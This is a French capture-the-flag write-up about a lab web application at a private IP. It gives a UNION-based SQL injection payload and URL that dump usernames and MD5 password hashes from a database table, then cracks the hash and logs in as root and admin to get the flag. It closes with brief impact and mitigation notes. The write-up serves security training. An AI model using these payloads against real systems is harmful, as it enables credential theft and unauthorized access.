# Explication

Nom de la faille:  member_brute_force

Aller sur l'URL:  `http://10.11.200.169/index.php?page=searchimg`

Il y a un input afin de chercher une image.

Commme expliqué précedemment, on a réussi à obtenir le schéma complet de la base SQL.

Pour cette faille là, on va se concentrer sur la table Member_Brute_Force.db_default qui a pour colonnes:
    `username, password`

En faisaint l'injection SQL:
```
	 1 OR 1=1 UNION select username, password FROM Member_Brute_Force.db_default 
```

http://10.11.200.169/index.php?page=searchimg&id=1+OR+1%3D1+UNION+select+username%2C+password+FROM+Member_Brute_Force.db_default+&Submit=Submit#

On trouve 2 `username` avec le même `password`.

```
    root : 3bf1114a986ba87ed28fc1b5884fc2f8
    admin : 3bf1114a986ba87ed28fc1b5884fc2f8
```

On decrypte le hash 3bf1114a986ba87ed28fc1b5884fc2f8 avec md5, on obtient alors `shadow`.

http://10.11.200.169/?page=signin&username=root&password=shadow&Login=Login#

On peut alors se logguer avec l'identifiant `admin` et `root` avec ce mot de passe. On otient alors le flag.

# Comment profiter de la faille ?

Une injection SQL peut mener à une destruction ou vol de données confidentielles.

Par exemple : vol de mots de passes, adresses email, ...

# Comment la fixe ?

Une des solutions les plus simples pour se prémunir de ce genre d'injections, il est possible d'utiliser différents outils (mySqli, PDO, ...).
Manuellement, cela consiste à vérifier qu'il n'y a aucun opérateur SQL dans la variable injectée.

# Autre manière de trouver la faille

Comme le nom l'indique, on peut brute force le nom et le mot de passe très facilement étant donnée la faiblesse de ce dernier.